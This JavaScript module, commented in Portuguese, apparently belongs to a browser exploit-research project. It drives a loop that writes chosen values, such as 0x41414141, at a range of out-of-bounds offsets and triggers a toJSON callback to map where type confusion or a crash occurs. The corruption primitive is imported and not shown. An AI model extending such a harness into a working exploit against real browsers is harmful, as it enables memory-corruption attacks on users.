// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs';
import { toHex } from '../utils.mjs';

// toJSON Minimalista para confirmar o ponto do TypeError
function toJSON_MinimalTriggerForCrash_MapZone() {
    current_toJSON_call_count_for_TypeError_test++; // Operação que causava TypeError
    document.title = `toJSON_MapZone Call ${current_toJSON_call_count_for_TypeError_test}`;
    return { minimal_call_in_map_zone: current_toJSON_call_count_for_TypeError_test };
}

async function runMapDangerZone_WithNewValues() {
    const FNAME_RUNNER = "runMapDangerZone_WithNewValues";
    logS3(`==== INICIANDO Mapeamento da "Zona de Perigo" com Novos Valores ====`, 'test', FNAME_RUNNER);

    const baseOffsetOOB = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128);
    const originalCriticalOffset = baseOffsetOOB - 16; // 0x70

    const offsetsToTest = [];
    for (let i = -16; i <= 16; i += 4) { // Faixa de 0x60 a 0x80
        offsetsToTest.push(originalCriticalOffset + i);
    }
    if (!offsetsToTest.includes(originalCriticalOffset)) {
        offsetsToTest.push(originalCriticalOffset);
        offsetsToTest.sort((a, b) => a - b);
    }
    
    logS3(`   Offsets a serem testados: ${offsetsToTest.map(o => toHex(o)).join(', ')}`, 'info', FNAME_RUNNER);

    const valuesForCorruption = [
        { desc: "Val_00000001", val: 0x00000001 },
        { desc: "Val_00000002", val: 0x00000002 },
        { desc: "Val_41414141", val: 0x41414141 }, // Padrão 'AAAA'
        { desc: "Val_12345678", val: 0x12345678 },
        // Adicionar aqui outros valores se desejar, como IDs de estrutura pequenos
    ];

    for (const currentOffset of offsetsToTest) {
        if (currentOffset < 0) continue;

        for (const valueCase of valuesForCorruption) {
            const testDescription = `MapZone_Offset_${toHex(currentOffset)}_Val_${valueCase.desc}`;
            logS3(`\n--- Testando Offset: ${toHex(currentOffset)} com Valor OOB: ${toHex(valueCase.val)} (${valueCase.desc}) ---`, 'subtest', FNAME_RUNNER);
            
            let result = await executeFocusedTestForTypeError(
                testDescription,
                toJSON_MinimalTriggerForCrash_MapZone, // Usando a toJSON que apenas incrementa contador e muda título
                valueCase.val,                         // O valor OOB atual
                currentOffset                          // O offset OOB atual
            );

            if (result.errorOccurred && result.errorOccurred.name === 'TypeError') {
                logS3(`   RESULTADO para Offset ${toHex(currentOffset)}, Valor ${toHex(valueCase.val)}: ${result.errorOccurred.name} ocorreu. Chamadas toJSON: ${result.calls}`, "vuln", FNAME_RUNNER);
            } else if (result.errorOccurred) {
                logS3(`   RESULTADO para Offset ${toHex(currentOffset)}, Valor ${toHex(valueCase.val)}: Outro erro: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON: ${result.calls}`, "warn", FNAME_RUNNER);
            } else if (result.potentiallyCrashed) {
                logS3(`   RESULTADO para Offset ${toHex(currentOffset)}, Valor ${toHex(valueCase.val)}: CONGELAMENTO POTENCIAL. Chamadas toJSON: ${result.calls}`, "error", FNAME_RUNNER);
            } else {
                logS3(`   RESULTADO para Offset ${toHex(currentOffset)}, Valor ${toHex(valueCase.val)}: Completou SEM TypeError. Chamadas toJSON: ${result.calls}`, "good", FNAME_RUNNER);
            }
            logS3(`   Título da página ao final do teste para Offset ${toHex(currentOffset)}, Valor ${toHex(valueCase.val)}: ${document.title}`, "info");
            await PAUSE_S3(MEDIUM_PAUSE_S3);

            if (document.title.startsWith("CONGELOU?")) {
                logS3(`Congelamento detectado no offset ${toHex(currentOffset)} com valor ${toHex(valueCase.val)}, interrompendo esta série de valores para o offset.`, "error", FNAME_RUNNER);
                break; // Interrompe o loop de valores para este offset se congelar
            }
        }
        if (document.title.startsWith("CONGELOU?")) {
             logS3(`Congelamento detectado, interrompendo mapeamento de offsets.`, "error", FNAME_RUNNER);
            break; // Interrompe o loop de offsets se congelar
        }
    }
    logS3(`==== Mapeamento da "Zona de Perigo" com Novos Valores CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_MapDangerZone_NewValues';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Mapeamento da "Zona de Perigo" com Novos Valores ====`, 'test', FNAME);
    document.title = "Iniciando Script 3 - Mapeamento Zona Perigo (Novos Valores)";
    
    await runMapDangerZone_WithNewValues();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Mapeamento da "Zona de Perigo" com Novos Valores) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.includes("ERRO") || document.title.includes("CONGELOU?")) {
        // Manter
    } else {
        document.title = "Script 3 Concluído - Mapeamento Zona Perigo (Novos Valores)";
    }
}
